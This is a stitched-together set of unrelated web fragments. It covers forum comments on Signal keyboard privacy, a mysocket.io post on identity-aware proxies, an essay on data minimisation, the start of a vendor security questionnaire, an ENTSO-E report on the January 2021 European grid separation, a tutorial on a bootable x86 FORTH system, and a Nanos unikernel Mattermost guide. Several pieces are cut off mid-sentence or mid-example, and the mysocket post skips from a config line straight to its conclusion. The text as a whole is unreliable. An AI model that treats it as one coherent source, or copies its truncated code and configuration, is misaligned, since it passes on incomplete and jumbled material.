          <p>Well, it has sometimes uses if you want to launch another app from an app with an intent. For example, if your app includes a user manual in pdf form and wants to show it in the standard pdf reader on the device. If there is no pdf reader you want to give a warning explaining the issue.</p>
<p>Code to heck it is really easy, see <a href="https://stackoverflow.com/questions/2695746/how-to-get-a-list-of-installed-android-applications-and-pick-one-to-run" rel="nofollow noopener">this article on Stackoverflow</a> how to do that.</p>
<p>The asked for checksum would require to locate the installed apk and read it, which requires root. And split apk’s would make it even more difficult.</p>

          <p>There was a lot of discussion on warning users that notifications could also be logged. It seems like there are a lot of problematic things in Android that people need to be aware of and protect themselves accordingly. I’m not sure how much of a role Signal should play in that or even if it needs to.</p>
<p>Other things I can immediately think of:<br>
export a photo?it might get stored in some cloud service<br>
listening to a voice note? the digital assistant might also be listening to it</p>

          <p>I understand the argument. The issue is that with the huge influx of new users, Signal do have a responsibility to flag such potential security flaws.</p>
<p>It seems like a pretty obvious thing for them to offer an untracked keyboard option in the app anyway, like some banking apps do. Or just a warning to ensure your Android device is secure.</p>

        <p>I agree that Signal should warn users who are using insecure IME. Signal has a responsibility to clearly communicate attack vectors to users, especially as an increasing number of less sophisticated users join the platform.</p>

        <p>Do you mean the incognito keyboard setting or do you want them to include a keyboard of their own? If the latter, it probably could be a well vetted separate app that someone else provides.</p>

This implicit trust problem is something we typically see with, for example, corporate VPNs. With most corporate VPN’s once a user is authenticated, the user becomes part of the corporate network and, as a result, has access to many of the resources within the corporate infrastructure. In other words, once you’re on the VPN, you’re within the walls of the castle, you’re trusted, and you have lots of lateral access.</span></p><p id="viewer-btiap"><span>The world is changing, and the once traditional approach of trusting devices on your network are over. A few years ago, Google started the journey to their implementation of Zero trust called Beyond Corp. One of the core building blocks to get to a Zero Trust model is Identity aware application proxies. These proxies can provide strict access control on a per-application granularity, taking the users’ identity and contexts such as location and device status into account.</span></p><h2 id="viewer-3ila3"><span>Identity aware proxies</span></h2><p id="viewer-57q5s"><span>As of today, the Mysocket proxies have support for OpenID Connect, and with that, your sockets are identity-aware. This means that mysocket users can now enable authentication for their services and provide authorization rules.</span></p><pre id="viewer-5rebq"><span>mysocketctl connect \
   --port 3000 \
   --name "My Identity aware socket" \
   --cloudauth \
   --allowed_email_domains "mycorp.com" \
   --allowed_email_addresses "<a href="mailto:contractor1@gmail.com" target="_blank" rel="noopener">contractor1@gmail.com</a><a href="mailto:,john@doe.com" target="_blank" rel="noopener">,john@doe.com</a>"</span></pre><p id="viewer-d2hm3"><span>The example above shows how we can enable authentication by using the “<em>cloudauth</em>” CLI parameter. With <em>cloudauth</em> enabled, users will be asked to authenticate before access to your service is granted. Currently, we support authentication using Google, Facebook, Github, or locally created accounts. </span></p><p id="viewer-1dt8o"><span>The authentication flow uses OpenID connect to interact with the various Identity providers (IDP); thus, we can easily add more Identity providers in the future. We’re also looking at SAML as a second authentication flow. Please let us know if you have a need for more IDP’s or SAML, and we’ll work with you.</span></p><h2 id="viewer-4nklj"><span>Authorizations rules</span></h2><p id="viewer-8klui"><span>In addition to what the Identity Service Provider (IDP) provides, mysocket also provides two authorization rules. The <em>— allowed_email_domain </em>allows users to specify a comma-separated list of email domains. If your users are authenticating using their <em>mycorp.com</em> email address, then by adding this domain as an <em>allowed_email_domain</em>, will make sure only users with that domain have will be granted access.</span></p><p id="viewer-dv1a2"><span>Since multiple identities providers are supported, it’s easy to extend access to contractors or other 3rd party users. To provide access to external contractors that are not part of your mycorp.com domain, we can use the <em>allowed_email_addresses</em> parameter to add individual identities. This is great because now you can provide these contractors access without creating corporate accounts for them.</span></p><p id="viewer-50slu"><span>These are just two authorization rules; we’re planning to add more types of rules in the near future. Additional authorization rules that come to mind are, Geo-based rules (only allow access from certain countries or regions) or time of day type rules. If you require these types of rules or have suggestions for additional authorization rules, please let us know!</span></p><h2 id="viewer-6g4ct"><span>VPN replacement</span></h2><p id="viewer-ejnaq"><span>One of the unique features of mysocket is that the origin server initiates the connection to the Mysocket edge. This means that the origin servers can be on a highly secure network that only allows outbound connections. Meaning the origins can be hosted behind strict firewall rules or even behind NAT, like for example, a Private AWS VPC. With this, your origin server remains private and hidden.</span></p><p id="viewer-7eejt"><span>With the addition of authentication and authorization to Mysocket, we can now, on a very granular basis, provide access to your private services. Combining the secure outbound tunnel property and the identity-aware sockets, we can now look at this to provide an alternative to VPNs, while providing much more granular access to private or corporate resources.</span></p><div id="viewer-3l8b0"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.mysocket.io/post/introducing-identity-aware-sockets-enabling-zero-trust-access-for-your-private-services" data-pin-media="https://static.wixstatic.com/media/3b930f_0db243c8687b436985efba502bc9ed8a~mv2.png/v1/fit/w_1000%2Ch_700%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/3b930f_0db243c8687b436985efba502bc9ed8a~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><h2 id="viewer-adqh4"><span>Example use case</span></h2><p id="viewer-8d2kt"><span>Imagine a scenario where you work with a contractor that needs access to one specific private application, say an internal wiki, ticket system, or the git server in your corporate network. With the traditional VPN setup, this means we’d need to provide the contractor with a VPN account. Typically this means the contractor is now part of the corporate network, has a corporate user account, and now has access to much more than just the application needed.</span></p><blockquote id="viewer-53kp2"><span>Instead, what we really want is to <strong><em>only</em></strong> provide access to the one application and be very granular in who has access. With the addition of identity-aware sockets, this is now possible.</span></blockquote><h2 id="viewer-bo80k"><span>Demo time!</span></h2><p id="viewer-ep41j"><span>Alright, let’s give this a spin, demo time! In this demo, we’re making a Grafana instance that’s on a private network and behind two layers of NAT available to our employees as well as a contractor.</span></p><p id="viewer-3tb1b"><span>We’ll start by setting up the socket and tunnel using the “<em>mysocketctl connect</em>” command.</span></p><p id="viewer-d4s79"><span>This works great for demo’s; for more permanent setups, it’s recommended to use “<em>mysocketctl</em> <em>socket create</em>” and “<em>mysocketctl</em> <em>tunnel create</em>” so that you have a permanent DNS name for your service.</span></p><pre id="viewer-9m2bk"><span>mysocketctl connect \
   --port 3000 \
   --name "My Identity aware socket" \
   --cloudauth \
   --allowed_email_domains "mycorp.com" \
   --allowed_email_addresses "<a href="mailto:contractor1@gmail.com" target="_blank" rel="noopener">andree@toonk.io</a><a href="mailto:,john@doe.com" target="_blank" rel="noopener">,john@doe.com</a>"</span></pre><p id="viewer-4n3gg"><span>With this, we created a socket on the mysocket.io infrastructure, enabled authentication, and provided a list of authorization rules. The same command also created the secure tunnel to the closest mysocket.io tunnel server, and we’re forwarding port 3000 on localhost to the newly created socket.</span></p><p id="viewer-kdc9"><span>Next, we launch a Grafana container. For fun, I’m passing in my AWS cloudwatch credentials, so I can create some dashboards for my AWS resources. I’ve configured grafana for proxy authentication. Meaning it will trust mysocket.io to do the authentication and authorization. Grafana will use the HTTP headers added by mysocket to determine the user information.</span></p><pre id="viewer-cdq3v"><span><span>[</span>auth<span>.</span>proxy<span>]</span>

We saw how Mysocket users can easily enable authentication for their HTTP(S) based sockets and how OpenID connect is used for the authentication flow to Google, Facebook, or Github (for now). We then looked at how authorization rules can be added by either matching the email domain or even a list of email addresses.</span></p><p id="viewer-chch1"><span>With this, it’s now easy to provide access to internal applications, from any device, any time anywhere, without the need for a VPN.</span></p></div></div></div></div></article></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>87% of the American population can be uniquely identified by a combination of just their ZIP code, gender, and date of birth. <a href="https://dataprivacylab.org/projects/identifiability/index.html">1</a> It doesn’t take much data to accurately identify a person.</p><p>Since 2020, more people than ever before perform their daily activities online. This includes working, shopping, playing, and even communicating with friends and family, all from the same device.</p><p>These daily interactions generate vast amounts of data. For example, Google alone processes more than 40,000 searches per second (3.5 billion searches per day) <a href="https://www.internetlivestats.com/google-search-statistics/">2</a>. And in the last two years alone, an astonishing 90% of the world’s data has been created.</p><p>To put that into perspective, consider how much data is generated every single day by a handful of services <a href="https://www.weforum.org/agenda/2019/04/how-much-data-is-generated-each-day-cf4bddf29f/">3</a>:</p><ul><li>More than 500 million tweets are sent.</li><li>294 billion emails are sent.</li><li>4 petabytes of data are created on Facebook.</li><li>4 terabytes of data are created from each connected car.</li><li>65 billion messages are sent on WhatsApp.</li></ul><p>That’s a lot of data, and you may be wondering: why would it matter if someone knows that I took an Uber to a restaurant last Friday, or that I like watching comedy movies on Saturday nights? Your data is more valuable than you think, but first, let's consider why data is being collected at all.</p><h2>Why collect data?</h2><p>Let's consider why data is collected in the first place. One example is that it can help website owners better understand how to improve the experience for their visitors. The people running a website need to be able to measure some broad metrics such as unique visitors, time spent on the website, how fast did the website load in each country, and so on. Without these metrics, they'd be essentially flying without navigation instruments.</p><p>Consider this: there’s now billions of videos on YouTube, and more than 300 hours of video are uploaded every minute. Finding good content that is relevant to you within that ocean of content, is like looking for a needle in a haystack. That's why companies have been building machine learning models that could better predict which content to show to you given billions of possible options. These models are also responsible for flagging inappropriate content, and automatically categorizing it to deliver a better experience for everyone.</p><p>But what is relevant for me, might not be relevant for you, and algorithms like this one learn from billions of example data points on the interactions performed by visitors across websites and apps. That is, broadly speaking, how most ranking and recommender systems work: you collect vast amounts of data to train a model that can make predictions of the given task, often with remarkable accuracy (and biases <a href="https://towardsdatascience.com/biases-in-machine-learning-61186da78591">4</a>). There are many different approaches being developed, and some even learn on your device without requiring to transfer your data to a cloud service <a href="https://ai.googleblog.com/2017/04/federated-learning-collaborative.html">5</a>. But that's for another post.</p><p>While many use cases do lead to improved experiences for the user, there have been cases in which the data has been re-purposed for manipulating and influencing people <a href="https://en.wikipedia.org/wiki/Facebook%E2%80%93Cambridge_Analytica_data_scandal">6</a>. With great power comes great responsibility, and it's unfortunate that there's been so many stories of power-abuse from those that have collected so much data.</p><p>So where do we draw the line? Data collection is necessary for businesses to build, and improve the products that people use every day. As Peter Drucker once said: “If you can’t measure it, you can’t improve it.” Data analytics is an essential part of the Internet ecosystem, and it’s important to increase awareness of the responsibilities that come along it.</p><h2>More is not always better</h2><p>Over the past decades, companies have been hoarding on vast amounts of data, but at some point we have to ask ourselves: is having more data always useful? As with most things in life, there's tradeoffs to every choice. It greatly depends on the problem at hand, for which purpose was the data collected, for how long will you keep it, and plenty other factors. The line is simply too blurry, and depends a lot on the context.</p><p>Consider this: let's assume Netflix collects a history of the movies you’ve recently watched, and whether you finished watching them or not. This data can help their recommendation algorithm understand what kind of content to suggest to you next. Do you like romantic comedies, but dislike horror movies? The algorithm will learn this over time, and improve the experience for you.</p><p>That may seem like a fair use of your data, but can your viewing history be exploited to influence you on broader topics? Consider a technique used in filmmaking called juxtaposition <a href="http://www.hollywoodlexicon.com/montage.html">7</a>, placing two things close together with a contrasting effect. This can be used to alter your perception of the relationship between the two elements placed next to each other. For example, by placing a video of a highly controversial topic, which you might dislike, next to an unrelated video about any other topic, you could create associations without them being explicitly there. Our brains tend to look for patterns, even where there are none. And over time, these implicit associations can build up, having profound effects on us, and influencing our behaviour.</p><p>As the world becomes aware of the responsibility that the entities collecting this data have in their hands, privacy regulations such as the General Data Protection Regulation (GDPR) are establishing a framework to give individuals control over their personal data, and to simplify the regulatory environment for businesses to make use of this data. GDPR compliance is an important topic for many companies, many of which have gotten huge fines already <a href="https://www.enforcementtracker.com/">8</a>. A lot has been changing in recent years, and these regulations could have significant effects on how companies innovate and grow. That’s why a solid, principled foundation is key to building a long-term, sustainable ecosystem.</p><h2>You’re not exempt from privacy regulations</h2><p>The responsibility to properly handle personal data applies to everyone who collects it, and not only to big enterprises. Whether it’s your family doctor in handwritten forms, or the local mom and pop restaurant making food deliveries, no one is exempt from the responsibility entrusted with handling personal data.</p><p>That’s why every piece of data you control is a liability. Collecting data just for the sake of it can do more harm than good, and you should consider whether you truly need it or not. Even after you collect it, you must ensure that it is protected with high security standards, as you automatically become the data controller under various privacy regulations.</p><p>So even on a small scale, whether it’s your personal blog, or small online shop, you have the responsibility to handle your visitors data with care, as they are trusting you with their data, and are becoming increasingly aware of this, which is a good thing.</p><h2>Privacy by default</h2><p>To be able to innovate, and improve the products we use every day, companies need to be able to measure, and understand user behaviour. And to do so, it’s a necessary evil to collect, and aggregate data so that business decisions can be informed on reality, and not on opinions.</p><p>Businesses should take steps towards privacy by design, which is crucial to minimizing risks, and essential to building long-term trust. Those numbers on reports, and dashboards represent people, and they deserve better.</p><p>In particular for businesses that play a major role in society, utmost care must be taken in order to avoid having models biased by the data that was fed into them, or unfairly balanced systems that have life-changing implications on your users. The topic of data ethics is broad, and deserves a more elaborate article than this paragraph, so I won't elaborate on it for now.</p><p>Today there are more and more ways to collect all kinds of data, including private, personally identifiable data. More data is not always better, and to reduce your liability, embrace the principle of data minimization.</p><p>You should only collect as much data as you truly require in order to provide your service. Collecting and processing personal data is a sensible topic, but if you recognize this and handle it properly, it can benefit everyone, including those who entrusted you with it.</p><hr><p><em>Disclaimer: I'm not a lawyer, and this is not legal advice.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Last year, one of our startups needed to buy a SaaS product (case management and workflow software). There were several promising vendors, all with products that looked impressive. Technically, all had the features and APIs we were looking for. However, we had security concerns. We planned on storing extremely sensitive data in this tool, and wanted to understand their security posture before we selected a vendor.</p><p>This a common problem; you’ve probably ran into it yourself. With SaaS software, how do you verify its security? As an industry, our answers are … poor. We have various certifications (PCI, HIPAA/HITECH, FedRAMP, etc), but all too often these are box-ticking exercises with no real security value – just ask <a href="https://www.schneier.com/blog/archives/2020/12/russias-solarwinds-attack.html">SolarWinds</a>.</p><p>So, security teams often end up sending potential vendors a bunch of questions – what Latacora calls a <a href="https://latacora.micro.blog/its-weird-to/">Dumb Security Questionnaire</a>. As the title implies, the practice … isn’t great. Most DSQs are full of questions with no security value (which explains why most security teams don’t actually read the responses!). But unfortunately, they’re also kinda the best we can do. Huge companies might be able to afford real human-powered security audits and convince vendors to allow them, but small startups like ours don’t have a better option than relying on DSQs.</p><p>As Latacora points out, it turns out there isn’t really a ton that you need to ask. As a startup, we’re not looking for our vendor to be Fort Knox; we just need to know that storing data with them is at least as safe as storing it internally. There are a limited number of likely ways that our vendor might get owned; we just need to ask about those few basic things. Latacora ends their post with this:</p><blockquote><p>Someone — and I am not volunteering — should write the DSQ that just nails these basic
things. 10 questions, no diagrams.</p></blockquote><p>Well, we tried; here it is.</p><h3 id="who-this-is-for">Who this is for</h3><p>This questionnaire is designed for smaller, probably early-stage companies who need to evaluate a vendor. It makes some assumptions:</p><ul><li>You have a security person (or team) who can evaluate the answers and is part of the decision-making process.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>On 8 January 2021 at 14:05 CET the synchronous area of Continental Europe was separated into two separated areas due to outages of several transmission network elements in a very short time. The route where the two areas were separated is the following:</p><p><img src="https://d33wubrfki0l68.cloudfront.net/e57eb58e915151390602cbb873b8422e952e5837/26de1/assets/graphics/uploads/first-image-mod.jpg" alt="" title="Figure 1 - Map of Continental Europe showing the two separated areas during the system event on 8 January 2021"></p><p><em>Figure 1 - Map of Continental Europe showing the two separated areas during the system event on 8 January 2021</em></p><p>At approximately 14:05 CET, the frequency in the North-West Area of Continental Europe initially decreased to a value of 49.74 Hz within a period of around 15 seconds. Afterwards, the frequency reached a steady state value of approximately 49.84 Hz. At the same time, the frequency in the South-East Area initially increased to a value of up to 50.6 Hz before settling at a steady state frequency between 50.2 Hz and 50.3 Hz. This can also be seen from the graph below.</p><p><img src="https://d33wubrfki0l68.cloudfront.net/af53041f1f9915046a980de1662f685154376b5c/304f8/assets/graphics/uploads/second-image-mod.png" alt="" title="Figure 2 - Frequency in Continental Europe during the event on 8 January 2021"></p><p><em>Figure 2 - Frequency in Continental Europe during the event on 8 January 2021</em></p><p>Due to the underfrequency in the North-West Area, contracted interruptible services in France and Italy, in total around 1.7 GW, were disconnected in order to reduce the frequency deviation. These services are large customers who are contracted by the respective Transmission System Operators (TSOs) disconnected if frequency drops under a certain threshold. In addition, 420 MW and 60 MW of supportive power were automatically activated from the Nordic and Great Britain Synchronous areas respectively. These countermeasures ensured that already at 14:09 CET the frequency deviation was limited to a deviation of around 0.1 Hz in the North-West Area from the nominal frequency of 50 Hz (see Figure 2).</p><p>Due to the large overfrequency in the South-East Area, automatic and manual countermeasures were activated (i.e. the reduction of the feed-in of generation units) in order to stabilise the frequency. Thus, at 15.05 CET the frequency deviation in the South-East Area could be limited to +0.1 Hz from the nominal frequency of 50 Hz (see Figure 2).</p><p>The automatic response and the coordinated actions taken by the TSOs in Continental Europe ensured that the situation was quickly restored to normal operations. Actions were coordinated between the TSOs in order to reconnect the two areas as fast as possible again. Therefore, the contracted interruptible services in Italy could be reconnected at 14:47 CET and in France at 14:48 CET. At 15:08 CET, both areas were connected again to one synchronous area in Continental Europe.</p><p>ENTSO-E has kept the European Commission and the Electricity Coordination Group composed of representatives of Member States informed.</p><p>ENTSO-E is publishing today also questions and answers with regards to this event. All information published is subject to the results of a detailed investigation on the event which is ongoing. The investigation is following the legal framework under the Commission Regulation (EU) 2017/1485 of 2 August 2017 (System Operation Guideline) whereby National Regulatory Authorities and ACER are invited to join together with TSOs in the Investigation Panel.</p><p>In line with the provisions of the Commission Regulation (EU) 2017/1485 of 2 August 2017 (System Operation Guideline), ENTSO-E will present the results of the investigation to the Electricity Coordination Group and will subsequently publish them once the analysis is completed.</p><p><strong><em>Questions and answers</em></strong></p><p><strong>What is a system separation?</strong></p><p>The transmission grids of the countries of Continental Europe are electrically tied together to operate synchronously at the frequency of approximately 50 Hz. An event on 8 January 2021 caused the Continental Europe synchronous area to separate into two areas, with an area in the South-East of Europe being temporarily operating in separation from the rest of Continental Europe.</p><p><strong>Is this the first time such an event happens in Continental Europe?</strong></p><p>The Continental Europe synchronous area is one of the largest interconnected synchronous electricity systems in the world in terms of its size and number of supplied customers. Such a kind of event can happen in any electric power system. System resilience and preparedness of system operators in charge have a decisive impact on the consequences of such events. A separation of the synchronous area with a much larger disturbance and impacts on customers took place in Continental Europe on the 4 November 2006. This event was extensively analysed and led to a number of substantial developments, like the European Awareness System (EAS) which is a platform allowing TSOs to exchange operational information in real time, enabling them to react immediately in case of unusual system condition. The TSOs are therefore well prepared in order to coordinate and manage such events and limit the consequences. This preparedness and a permanent observation of the system frequency allowed to resynchronize the two separated areas in a very short period of time.</p><p><strong>How are countermeasures coordinated in Continental Europe in case of frequency deviations?</strong></p><p>In Continental Europe, procedures are in place to avoid system disturbances and especially large frequency deviations with the risk of uncoordinated disconnection of customers or generation. The TSOs Amprion (Germany) and Swissgrid (Switzerland) are responsible for these procedures in their role as synchronous area monitor (SAM) in Continental Europe. The SAM continuously monitors the system frequency. In case of large frequency deviations, they inform all TSOs via the European Awareness System (EAS) and launch an extraordinary procedure for frequency deviations to coordinate countermeasures in a fast and effective manner in order to stabilize the system. One step of this procedure is a telephone conference by Amprion, Swissgrid, RTE (France), Terna (Italy) and REE (Spain). This teleconference took place at 14:09 CET on 8 January 2021. In the telephone conference, the situation was evaluated, the TSOs informed about countermeasures which were already activated. The TSOs of the North-West and South-East area also coordinated the actions for reconnection in order to reach one synchronous area in Continental Europe again.</p><p><strong>Were end customers disconnected? Were there any other consequences?</strong></p><p>Customers in the order of 70 MW in the North-East Area and in the order of 163 MW in the South-East Area were disconnected. Due to the high resilience of the interconnected network and the rapid response of European TSOs, the security of operation and electricity supply was not endangered. An important contribution to stabilizing the system was delivered by the previously contracted interruptible services, which were activated in France and Italy. Such contracts which have been agreed with customers allow the TSO to temporarily and automatically reduce their electrical consumption depending on the situation with the electric power system in real-time.</p><p><strong>What caused the separation?</strong></p><p>In line with the provisions of the System Operation Guideline, a detailed investigation is ongoing on the event. This includes a comprehensive analysis of large numbers of real-time recordings from protection devices and other electric power system elements. ENTSO-E will publish the results of this investigation as soon as the analysis is finalised.</p><p><strong>Press Contact:</strong> Claire Camus &nbsp;+32 476 975093 claire.camus@entsoe.eu</p></div></div></div></div>]]>

<p>In this post I develop a simple
<a href="http://users.ece.cmu.edu/~koopman/forth/hopl.html">FORTH</a>
system which can be put on a USB stick and will boot on an x86 PC into an interactive
REPL. It's really just the beginning of a self-hosted development environment but it does have the basic ability to accept
keyboard input, display results on screen, execute FORTH words and enter integers.
</p>
<p>I'm exploring the idea of how <em>little</em> assembler we can use to bootstrap an interactive development environment on a new machine.
</p>
<h2> abstraction and portablity</h2>
<p>The less assembler we have to write to bootstrap our system, the less work we have to do to port the system onto another platform.
FORTH allows us to start writing the FORTH system in FORTH itself, long before we have anything as complicated as a self-hosted compiler
or assembler <span>We write forth words using assembler data definitions</span>.
</p>
<p>The aim is to write the minimum amount of assembler possible and start writing FORTH as early as possible. This will certainly not
provide the most speed/size efficient system, but will provide the most portable system.
</p>
<h2> x86 16-bit code</h2>
<p>I am forced to write this system in 16-bit x86 <em>real mode</em> assembler, the assembler of the 8086 processor which lives on in
every intel chip.
</p>
<p>The reason for this is that I want to make use of the BIOS code for accessing screen, keyboard and disk and the PC BIOS
only runs as long as the processor remains in <em>real mode</em>.
</p>
<p>Even if you are familiar with x86 assembler this, restricted machine, may be new to you.
</p>
<p>The system is built using the
<a href="https://nasm.us/"><code>nasm</code></a>
assembler
since it provides an easy way to develop 16-bit, x86 code and generate flat executables suitable for PC boot.
It also provides macros which make things easier.
</p>
<h2> FORTH allows for a very simple VM core</h2>
<p>With just 2 assembly routines, <code>enter</code> and <code>exit</code>, FORTH provides a VM core engine.
One must decide on registers to store the 2 required stacks (data and return) and also the code pointer and then these two routines
provide the engine for all FORTH control flow.
</p>
<p>I'll just assume that you know FORTH is a stack machine and all function/word arguments are passed explicitly on the data stack.
Calling a function/word just uses the name of that word. There is no parameter passing; parameters are expected to be on the stack.
</p>
<p>As usual the full code is linked at the end.
</p>
<h3> FORTH VM briefly described</h3>
<p>I'll try to describe the FORTH VM approach here briefly. Rather than using normal call/ret, FORTH takes control of this explicitly with
a return stack and jumps. FORTH functions (called words) can be seen as a vector of pointers to code (Code Field Addresses/CFA).
The machine's <em>code pointer</em> points at these vectors and jumps to the code pointed at by the vector entries (2 indirection levels).
To move to the next instruction/word/function we just increment the code pointer.
</p>
<p>To call another FORTH word we just point the code pointer to it's CFA vector and push the address of the next CFA so we can return here.
</p>
<p>Eventually we need to call <em>real</em> code. So all CFA's actually point
to assembler and we just jump there. For primitive words, this is fine. For FORTH words there is a special assembler prelude (called ENTER) which
actually does the return stack push, and the change of the code pointer to point to the current word's CFA vector.
<span>So the call is actually handled inside the callee rather than by the caller</span>.
</p>
<p>The <em>end</em> of a CFA vector is just another (primitive) FORTH word called <code>exit</code>. This contains assembler code to pop the
code pointer off the return stack and jump to it, thus continuing from the word after the one calling this word.
</p>
<p>This is a little mind-bending to explain, but the actual code to do it is shorter than even this brief description and is listed below.
</p>
<p>Here's some more info on the <em>threaded code</em> approach.
<a href="http://www.bradrodriguez.com/papers/moving1.htm">http://www.bradrodriguez.com/papers/moving1.htm</a>
</p>
<h3> VM register definitions and code</h3>
<p>I've chosen the following register setup for my code pointer and stacks (the 8086 is very limited, and there is not a lot of choice).
</p>
<ul><li>
register DI is code-pointer
</li><li>
register BP is return stack
</li><li>
register SP is data stack
</li></ul>
<p>I'll define some assembler macros to rename the chosen registers to more FORTH-like names:
</p>
<pre>%define codeptr di
%define rstack bp
%define dstack sp
</pre>
<p>As an example, the top-level function in this system looks like this. It begins with the <code>enter</code> prelude macro
and is then just a list of pointers to assembly code blocks, the final one being <code>exit</code>.
</p>
<pre>main:
  enter
  dw cls, lit, str_welcome, puts, interpret, exit
</pre>
<p>Here are the <code>enter</code> and <code>exit</code> macros which provide the VM code I need to inline in other places.
</p>
<p>Note that non-FORTH, primitive words don't actually use the return stack. They don't start with the <code>enter</code>
code and have their own <code>primexit</code> code at the end.
</p>
<pre>;; this asm code is inlined at the start of every forth word to setup the
;; code pointer to point at the start of the CFA vector
%define entry_code_len 18 ; must be updated if macro enter is changed
%macro enter 0
  rpush
  mov codeptr, [codeptr] ; code-pointer = this word's ENTER code
  add codeptr, entry_code_len ; offset code-pointer to just after ENTER code i.e. start of cfa vector
  next ; run first cfa in this word's cfa vector
%endmacro
;; this asm code is inlined at the end of every primitive/pure asm word
;; to continue executing with the next CFA in the vector
%macro primexit 0
  add codeptr, 2 ; move code-pointer to next cfa vector entry
  next
%endmacro
;; forth primitive used to exit forth words
exit:
  rpop
  next
</pre>
<p>Some other helper macros used above:
</p>
<pre>;; execute next word
%macro next 0
  jmp [codeptr]
%endmacro
;; push to return stack for forth word call
%macro rpush 0
  mov dx, codeptr
  add dx, 2
  sub rstack, 2
  mov word [rstack], dx
%endmacro
;; pop from return stack to resume after word call
%macro rpop 0
  mov codeptr, [rstack]
  add rstack, 2
%endmacro
</pre>
<h3> loops</h3>
<p>To write useful code we need loops. I've decided to use the tail-call approach to loops. <code>loop</code> allows a FORTH word
to return to its beginning and that's enough to implement loops. We find the current word's beginning (it's CFA vector)
by cheating. We look at the entry on the return stack. It points just after the word calling this one. If we step back
we can get the CFA for this word. Then we just skip the entry prelude assembler code and have a pointer to the CFA
vector for this word. We jump there and we have looped. Simple!
</p>
<pre>loop:
  ; jump back to start of current function (tail call)
  mov codeptr, [rstack] ; rpeek
  sub codeptr, 2
  mov codeptr, [codeptr] ; current word entry
  add codeptr, entry_code_len ; skip entry prelude to cfa vec
  next
</pre>
<h3> conditional branches</h3>
<p>Conditional exit is like normal exit at the end of a word (in fact exit can be used anywhere
in a word) but it only happens if the value popped off the stack is zero. Again this is enough to implement if/then/else and
while loops. You just need to make a separate word for each IF statement and exit early to avoid the body of the IF.
</p>
<pre>zexit:
  pop ax
  cmp ax, 0
  jnz .donothing
  rpop ; exit
  next
.donothing:
  primexit
</pre>
<p>In fact I initially just had conditional exit, but I later added a conditional jump which adds an offset to the code pointer if
the stack top is zero. It requires manually counting the offset from after the instruction to the next instruction and changing
that every time the intervening code changes length.
<span>a FORTH compiler would handle this automatically by providing an if/then/else construct.</span>
</p>
<pre>zjump:
  add codeptr, 2
  pop ax
  cmp ax, 0
  jnz .donothing
  add codeptr, [codeptr]
.donothing:
  primexit
</pre>
<p>Here's an example use of an unconditional <code>jump</code> instead of loop and a variant of <code>zexit</code>.
</p>
<pre>puts:
  enter
  dw dup, cfetch, zexitkeep, emit, inc, jump, -7*2, exit
</pre>
<h3> literals</h3>
<p>Since CFA vectors just have code addresses how do we get numbers/addresses on the data stack? There is a special primitive word
called <code>lit</code> which takes the next CFA in the vector, pushes it on the data stack and skips it (since it's not really a CFA).
</p>
<pre>lit:
  add codeptr, 2
  mov ax, [codeptr]
  push ax
  primexit
</pre>
<h2> Machine IO</h2>
<p>The only things we need to create a minimal, self-hosted, development environment on a platform are
</p>
<ul><li>
screen character output (think terminal)
</li><li>
keyboard input
</li><li>
basic disk access (for loading and saving text files)
</li></ul>
<p>The x86 BIOS provides reasonably simple interfaces to these which makes developing this system easier than for other platforms
(see discussion of ARM systems below).
</p>
<p>I started off proving that I can get the screen and keyboard working. With the eventual goal of having some kind of interactive REPL.
</p>
<p>Here we see <code>main</code>, the top-level entry word for the system. It's actually written in FORTH not assembler.
</p>
<ul><li>
First we have the <code>enter</code> macro (which adds in the assembler to make a block of code behave as a FORTH word).
</li><li>
Next we have the CFA vector, which is a list of CFA's (code addresses). This vector is
created using the NASM pseudo op <code>dw</code> (define word) which creates a list of inlined 16-bit constants. Each of these is the address of
an assembler routine. We also see <code>exit</code> at the end which is an assembler routine that knows how to return from a FORTH word.
</li></ul>
<p><span>Actually main is not allowed to return, and interpret is a loop.</span>
</p>
<pre>main:
  enter
  dw cls, lit, str_welcome, puts, interpret, exit
</pre>
<p>In <em>real FORTH</em> this would look something like this:
</p>
<pre>: main cls ." Welcome to FORTH!" interpret ;
</pre>
<p><span>where ." is a magical compiler immediate which puts the following string somewhere in memory and compiles in [lit, addr, puts] instead</span>
</p>
<h3> screen output</h3>
<p>The FORTH word <code>emit</code> puts a single character on screen and updates the cursor position for the next character.
We can build more complicated string output words on that basis.
</p>
<p>Here is the underlying bios call for character output and the FORTH word emit which calls it and keeps track of the cursor update.
I don't include the cursor update code since it's a bit involved. It uses conditionals to check overflow
and a global to keep the cursor position (see code linked at end).

                <p>Mattermost is an open source, private cloud slack
alternative written in Go and React. It has many integrations and can
can connect to mysql or postgres for persistence. While there are many
"hello world" tutorials out there for running the Nanos unikernel we
thought this would be a nice little example to showcase two things:</p>

<p>1) How to run a multi-node setup. Most web applications are more than
just one actual application - the canonical example would be a webapp
server and its corresponding database.</p>
<p>2) How to interact with taps and bridges for a faster networking
experience or if you wanted to build your own private cloud. (Creating taps,
today, will only work on Linux as the tuntaposx package does not work
anymore but we're looking at alternatives.)</p>

<p>Ready? Let's get started.</p>

                <h3>Running mysql as a Nanos unikernel</h3>

                <p>We start by running the mysql server as a unikernel.
We've created a convenient package to use and the only thing you need to
do is set your base volume size. You could create an external volume but
we'll leave that to a different article.</p>

<pre><code>{
  "BaseVolumeSz": "400m"
}
</code></pre>

<p>Now let's run mysql by creating a tap device and assigning it a
static ip:</p>

                <pre><code>➜  mysql ops load mysql_5.7.29 -c config.json -p 3306 -b -t tap0 --ip-address 192.168.42.19

</code></pre>

<p>We should be able to connect to the server and create a mattermost
database:</p>

                <pre><code>mysql -u root -h 192.168.42.19
create datbase mattermost;</code></pre>

<p>Ops load by default will re-build the image each time so if you want
to skip that you can pass the '-s' flag or use 'ops instance create' instead.</p>

                <h3>Running MatterMost as a Unikernel</h3>

<p>For mattermost we'll want to edit the mattermost config.json (not to
be confused with the config.json we use for ops). Create a 'config'
directory to store it in. Copy the config.json in. If you want, you can
untar the tarball found in ~/.ops/packages/mattermost_5.12.0.tar.gz and grab a
copy there. Then you'll want to edit the mysql "DataSource" line in
